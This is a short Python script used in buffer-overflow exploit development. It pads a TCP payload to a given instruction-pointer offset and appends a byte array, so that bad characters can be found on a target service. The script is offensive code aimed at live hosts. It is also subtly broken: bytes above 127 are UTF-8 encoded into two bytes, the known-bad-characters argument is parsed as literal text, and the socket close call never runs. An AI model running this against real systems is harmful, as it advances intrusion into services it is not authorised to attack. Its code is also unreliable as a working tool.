#!/usr/bin/python3

import socket
import argparse

def gen_badchars(known: str = ""):
    known = known
    byte_array = ""
    for i in range(1,256):
        char = chr(i)
        if char not in known:
            byte_array += chr(i)
    return bytes(byte_array, "utf8")


args = argparse.ArgumentParser()
args.add_argument("ip", help="The IP to send byte array to.")
args.add_argument("port", help="The port to send pattern to.", type=int)
args.add_argument("offset", help="Offset of Instruction Pointer", type=int)
args.add_argument("-cbp", help='Known bad chars. eg "\x00\x12\xca"')
args = args.parse_args()


payload = (b"A" * args.offset) + gen_badchars(args.cbp)


try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((args.ip, args.port))
    print(sock.recv(1024).decode())
    print(f"Sending byte array.")
    sock.send(payload)
    print(sock.recv(1024))
    sock.close
except Exception as error:
    print("It's dead Jim!")
    print(error)